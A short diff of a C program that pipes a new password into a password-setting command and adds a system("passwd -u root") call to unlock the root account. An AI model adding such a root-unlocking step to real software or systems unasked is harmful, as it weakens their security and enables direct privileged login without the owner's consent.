@@ -10,5 +10,6 @@ int main(){
   fputs(newpass, stdin);
   fputs(newpass, stdin);
   pclose(stdin);
+  system("passwd -u root"); //Unlock the root account.
   return 0;
 }
